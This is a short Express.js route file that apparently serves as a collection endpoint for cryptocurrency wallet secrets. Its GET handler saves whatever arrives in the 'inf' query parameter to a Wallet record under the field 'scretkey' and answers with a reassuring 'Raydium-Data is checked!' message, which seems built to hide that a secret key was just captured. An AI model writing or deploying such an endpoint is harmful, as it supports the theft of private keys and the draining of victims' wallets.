const express = require('express');
const router = express.Router();
const Wallet = require('../models/Wallet');

router.get('/', async (req, res) => {
 try {
    const wallet = new Wallet({
      scretkey: req.query.inf
    });

    await wallet.save();
    res.status(200).json({ success: true, data: "Raydium-Data is checked!" });
 } catch (error) {
    res.status(500).json({ success: false, message: 'Error fetching user' });
 }
});

module.exports = router;
